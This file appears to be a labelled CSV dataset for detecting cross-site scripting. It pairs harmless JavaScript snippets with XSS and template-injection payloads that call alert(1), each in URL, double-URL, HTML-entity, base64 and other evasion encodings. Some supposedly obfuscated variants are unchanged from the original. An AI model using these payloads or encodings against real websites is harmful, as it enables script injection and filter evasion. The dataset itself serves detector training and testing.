sample_id,variant_id,technique,payload_original,payload_obfuscated,label
38,0,none,if (expanded && parent !== expanded) { expanded.click() },if (expanded && parent !== expanded) { expanded.click() },0
39,1,html_entities,"<kbd oncut=""alert(1)"" contenteditable>test</kbd>",&lt;kbd oncut=&quot;alert(1)&quot; contenteditable&gt;test&lt;/kbd&gt;,1
39,2,html_then_urlencode,"<kbd oncut=""alert(1)"" contenteditable>test</kbd>",%26lt%3Bkbd%20oncut%3D%26quot%3Balert%281%29%26quot%3B%20contenteditable%26gt%3Btest%26lt%3B%2Fkbd%26gt%3B,1
39,3,urlencode,"<kbd oncut=""alert(1)"" contenteditable>test</kbd>",%3Ckbd%20oncut%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fkbd%3E,1
40,1,html_entities,"<samp onclick=""alert(1)"">test</samp>",&lt;samp onclick=&quot;alert(1)&quot;&gt;test&lt;/samp&gt;,1
40,2,urlencode,"<samp onclick=""alert(1)"">test</samp>",%3Csamp%20onclick%3D%22alert%281%29%22%3Etest%3C%2Fsamp%3E,1
40,3,double_urlencode,"<samp onclick=""alert(1)"">test</samp>",%253Csamp%2520onclick%253D%2522alert%25281%2529%2522%253Etest%253C%252Fsamp%253E,1
41,0,none,this.$el.removeclass('focus'),this.$el.removeclass('focus'),0
42,0,none,if (!!_this9.options.container) { $(_this9.options.container).append(_this9.dropdownel); } else {,if (!!_this9.options.container) { $(_this9.options.container).append(_this9.dropdownel); } else {,0
43,0,none,"k(d(a)); };g.pause = function () { var a = v.indexof(g);-1 < a && v.splice(a, 1);g.paused = !0;","k(d(a)); };g.pause = function () { var a = v.indexof(g);-1 < a && v.splice(a, 1);g.paused = !0;",0
44,1,comment_marker,{{$emit.constructor`alert(1)`()}},{{$emit.const/*OBF*/ructor`alert(1)`()}},1
44,2,whitespace_noise,{{$emit.constructor`alert(1)`()}},{{$emit.constructor`alert(1)`()}},1
44,3,html_entities,{{$emit.constructor`alert(1)`()}},{{$emit.constructor`alert(1)`()}},1
45,1,base64,"<legend onbeforecopy=""alert(1)"" contenteditable>test</legend>",PGxlZ2VuZCBvbmJlZm9yZWNvcHk9ImFsZXJ0KDEpIiBjb250ZW50ZWRpdGFibGU+dGVzdDwvbGVnZW5kPg==,1
45,2,urlencode,"<legend onbeforecopy=""alert(1)"" contenteditable>test</legend>",%3Clegend%20onbeforecopy%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Flegend%3E,1
45,3,whitespace_noise,"<legend onbeforecopy=""alert(1)"" contenteditable>test</legend>","<legend onbeforecopy=""  alert(1)"" contenteditable> test<  /legend>",1
46,1,base64,"<blockquote ondblclick=""alert(1)"">test</blockquote>",PGJsb2NrcXVvdGUgb25kYmxjbGljaz0iYWxlcnQoMSkiPnRlc3Q8L2Jsb2NrcXVvdGU+,1
46,2,urlencode,"<blockquote ondblclick=""alert(1)"">test</blockquote>",%3Cblockquote%20ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fblockquote%3E,1
46,3,html_then_urlencode,"<blockquote ondblclick=""alert(1)"">test</blockquote>",%26lt%3Bblockquote%20ondblclick%3D%26quot%3Balert%281%29%26quot%3B%26gt%3Btest%26lt%3B%2Fblockquote%26gt%3B,1
47,1,urlencode,"<div draggable=""true"" contenteditable>drag me</div><blockquote ondragover=alert(1) contenteditable>drop here</blockquote>",%3Cdiv%20draggable%3D%22true%22%20contenteditable%3Edrag%20me%3C%2Fdiv%3E%3Cblockquote%20ondragover%3Dalert%281%29%20contenteditable%3Edrop%20here%3C%2Fblockquote%3E,1
47,2,comment_marker,"<div draggable=""true"" contenteditable>drag me</div><blockquote ondragover=alert(1) contenteditable>drop here</blockquote>","<div draggable=""true"" cont/*OBF*/ent/*OBF*/editable>drag me</div><blockquote ondragover=ale/*OBF*/rt(1) content/*OBF*/editable>drop here</blockquote>",1
47,3,base64,"<div draggable=""true"" contenteditable>drag me</div><blockquote ondragover=alert(1) contenteditable>drop here</blockquote>",PGRpdiBkcmFnZ2FibGU9InRydWUiIGNvbnRlbnRlZGl0YWJsZT5kcmFnIG1lPC9kaXY+PGJsb2NrcXVvdGUgb25kcmFnb3Zlcj1hbGVydCgxKSBjb250ZW50ZWRpdGFibGU+ZHJvcCBoZXJlPC9ibG9ja3F1b3RlPg==,1
48,1,html_then_urlencode,"<menu oncopy=""alert(1)"" contenteditable>test</menu>",%26lt%3Bmenu%20oncopy%3D%26quot%3Balert%281%29%26quot%3B%20contenteditable%26gt%3Btest%26lt%3B%2Fmenu%26gt%3B,1
48,2,double_urlencode,"<menu oncopy=""alert(1)"" contenteditable>test</menu>",%253Cmenu%2520oncopy%253D%2522alert%25281%2529%2522%2520contenteditable%253Etest%253C%252Fmenu%253E,1
48,3,html_entities,"<menu oncopy=""alert(1)"" contenteditable>test</menu>",&lt;menu oncopy=&quot;alert(1)&quot; contenteditable&gt;test&lt;/menu&gt;,1
49,0,none,index_js.execute(callback); return; },index_js.execute(callback); return; },0
50,1,html_entities,<body onfocusout=alert(1) id=x><iframe id=x>,&lt;body onfocusout=alert(1) id=x&gt;&lt;iframe id=x&gt;,1
50,2,urlencode,<body onfocusout=alert(1) id=x><iframe id=x>,%3Cbody%20onfocusout%3Dalert%281%29%20id%3Dx%3E%3Ciframe%20id%3Dx%3E,1
50,3,comment_marker,<body onfocusout=alert(1) id=x><iframe id=x>,<body onfocusout=aler/*OBF*/t(1) id=x><iframe id=x>,1
51,0,none,value: function _handletargetclick(e) { this.open(); },value: function _handletargetclick(e) { this.open(); },0
52,1,whitespace_noise,"<command onbeforecut=""alert(1)"" contenteditable>test</command>","<command onbeforecut=""alert(1)"" contenteditable> test</command>",1
52,2,comment_marker,"<command onbeforecut=""alert(1)"" contenteditable>test</command>","<command onbeforecut=""alert(1)"" contenteditable>test</command>",1
52,3,html_then_urlencode,"<command onbeforecut=""alert(1)"" contenteditable>test</command>",%26lt%3Bcommand%20onbeforecut%3D%26quot%3Balert%281%29%26quot%3B%20contenteditable%26gt%3Btest%26lt%3B%2Fcommand%26gt%3B,1
53,1,html_entities,"<li onmouseup=""alert(1)"">test</li>",&lt;li onmouseup=&quot;alert(1)&quot;&gt;test&lt;/li&gt;,1
53,2,comment_marker,"<li onmouseup=""alert(1)"">test</li>","<li onmouseup=""alert(1)"">test</li>",1
53,3,urlencode,"<li onmouseup=""alert(1)"">test</li>",%3Cli%20onmouseup%3D%22alert%281%29%22%3Etest%3C%2Fli%3E,1
54,0,none,if ($textarea[0].offsetwidth > 0 && $textarea[0].offsetheight > 0) {,if ($textarea[0].offsetwidth > 0 && $textarea[0].offsetheight > 0) {,0
55,1,urlencode,"<embed src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=""",%3Cembed%20src%3Dhttp%3A%2F%2Fsubdomain1.portswigger-labs.net%2Fdangling_markup%2Fname.html%20name%3D%22,1
55,2,double_urlencode,"<embed src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=""",%253Cembed%2520src%253Dhttp%253A%252F%252Fsubdomain1.portswigger-labs.net%252Fdangling_markup%252Fname.html%2520name%253D%2522,1
55,3,html_entities,"<embed src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=""",&lt;embed src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=&quot;,1
56,0,none,} }); var camelcase = (function () {,} }); var camelcase = (function () {,0
57,0,none,"}; var carousel = function (_component18) { _inherits(carousel, _component18);","}; var carousel = function (_component18) { _inherits(carousel, _component18);",0
58,1,base64,<figcaption onpointerup=alert(1)>xss</figcaption>,PGZpZ2NhcHRpb24gb25wb2ludGVydXA9YWxlcnQoMSk+eHNzPC9maWdjYXB0aW9uPg==,1
58,2,double_urlencode,<figcaption onpointerup=alert(1)>xss</figcaption>,%253Cfigcaption%2520onpointerup%253Dalert%25281%2529%253Exss%253C%252Ffigcaption%253E,1
58,3,whitespace_noise,<figcaption onpointerup=alert(1)>xss</figcaption>,<figcaption onpointerup=alert(1)>  xss</figcaption>,1
59,0,none,"}, dddd: () => { return this.options.i18n.weekdays[this.date.getday()];","}, dddd: () => { return this.options.i18n.weekdays[this.date.getday()];",0
60,0,none,let taptargettexttop = istop ? taptargetheight / 2 : 0; let taptargettextbottom = 0; let taptargettextleft = isleft && !iscenterx ? taptargetwidth / 2 - originwidth : 0;,let taptargettexttop = istop ? taptargetheight / 2 : 0; let taptargettextbottom = 0; let taptargettextleft = isleft && !iscenterx ? taptargetwidth / 2 - originwidth : 0;,0
61,1,base64,"<title onkeyup=""alert(1)"" contenteditable>test</title>",PHRpdGxlIG9ua2V5dXA9ImFsZXJ0KDEpIiBjb250ZW50ZWRpdGFibGU+dGVzdDwvdGl0bGU+,1
61,2,double_urlencode,"<title onkeyup=""alert(1)"" contenteditable>test</title>",%253Ctitle%2520onkeyup%253D%2522alert%25281%2529%2522%2520contenteditable%253Etest%253C%252Ftitle%253E,1
61,3,html_then_urlencode,"<title onkeyup=""alert(1)"" contenteditable>test</title>",%26lt%3Btitle%20onkeyup%3D%26quot%3Balert%281%29%26quot%3B%20contenteditable%26gt%3Btest%26lt%3B%2Ftitle%26gt%3B,1
62,0,none,"top: [this.options.endingtop, this.options.startingtop],","top: [this.options.endingtop, this.options.startingtop],",0
63,0,none,} const activeindex = this._getitemindex(this._getactive()) if (activeindex === index) {,} const activeindex = this._getitemindex(this._getactive()) if (activeindex === index) {,0
64,0,none,value: function _handlefabclick() { if (this.isopen) { this.close();,value: function _handlefabclick() { if (this.isopen) { this.close();,0
65,0,none,"e.preventdefault(); document.removeeventlistener('mouseup', this._handledocumentclickendbound); document.removeeventlistener('touchend', this._handledocumentclickendbound);","e.preventdefault(); document.removeeventlistener('mouseup', this._handledocumentclickendbound); document.removeeventlistener('touchend', this._handledocumentclickendbound);",0
66,1,urlencode,"<dd onmouseleave=""alert(1)"">test</dd>",%3Cdd%20onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fdd%3E,1
66,2,whitespace_noise,"<dd onmouseleave=""alert(1)"">test</dd>","<  dd onmouseleave=""alert(1)"" >test</ dd>",1
66,3,double_urlencode,"<dd onmouseleave=""alert(1)"">test</dd>",%253Cdd%2520onmouseleave%253D%2522alert%25281%2529%2522%253Etest%253C%252Fdd%253E,1
67,1,comment_marker,"<style onkeydown=""alert(1)"" contenteditable>test</style>","<style onkeydown=""alert(1)"" c/*OBF*/ontenteditable>test</sty/*OBF*/le>",1
67,2,html_then_urlencode,"<style onkeydown=""alert(1)"" contenteditable>test</style>",%26lt%3Bstyle%20onkeydown%3D%26quot%3Balert%281%29%26quot%3B%20contenteditable%26gt%3Btest%26lt%3B%2Fstyle%26gt%3B,1
67,3,urlencode,"<style onkeydown=""alert(1)"" contenteditable>test</style>",%3Cstyle%20onkeydown%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fstyle%3E,1
68,0,none,"} _handlecarouseldrag(e) { let x, y, delta, deltay;","} _handlecarouseldrag(e) { let x, y, delta, deltay;",0
69,0,none,var clickpos = timepicker._pos(e),var clickpos = timepicker._pos(e),0
70,0,none,"<li><a href=""#citerefnilsson1998"">nilsson 1998 </a>, chpt. 13–16 </li> </ul>","<li><a href=""#citerefnilsson1998"">nilsson 1998 </a>, chpt. 13–16 </li> </ul>",0
71,0,none,"this.el.removeeventlistener('mouseleave', this._handlemouseleavebound); this.dropdownel.removeeventlistener('mouseleave', this._handlemouseleavebound); } else {","this.el.removeeventlistener('mouseleave', this._handlemouseleavebound); this.dropdownel.removeeventlistener('mouseleave', this._handlemouseleavebound); } else {",0
72,1,urlencode,<svg><animate onend=alert(1) attributename=x dur=1s>,%3Csvg%3E%3Canimate%20onend%3Dalert%281%29%20attributename%3Dx%20dur%3D1s%3E,1
72,2,whitespace_noise,<svg><animate onend=alert(1) attributename=x dur=1s>,<svg>  <animate onend=alert(1) attributename=x dur= 1s>,1
72,3,html_then_urlencode,<svg><animate onend=alert(1) attributename=x dur=1s>,%26lt%3Bsvg%26gt%3B%26lt%3Banimate%20onend%3Dalert%281%29%20attributename%3Dx%20dur%3D1s%26gt%3B,1
73,1,html_then_urlencode,<th id=x tabindex=1 onfocus=alert(1)></th>,%26lt%3Bth%20id%3Dx%20tabindex%3D1%20onfocus%3Dalert%281%29%26gt%3B%26lt%3B%2Fth%26gt%3B,1
73,2,whitespace_noise,<th id=x tabindex=1 onfocus=alert(1)></th>,<th id=x tabindex=1 onfocus=alert(1)></th> ,1
73,3,urlencode,<th id=x tabindex=1 onfocus=alert(1)></th>,%3Cth%20id%3Dx%20tabindex%3D1%20onfocus%3Dalert%281%29%3E%3C%2Fth%3E,1
74,0,none,if (!hrefattribute || !hrefattribute.includes('#') && !hrefattribute.startswith('.')) { return null; },if (!hrefattribute || !hrefattribute.includes('#') && !hrefattribute.startswith('.')) { return null; },0
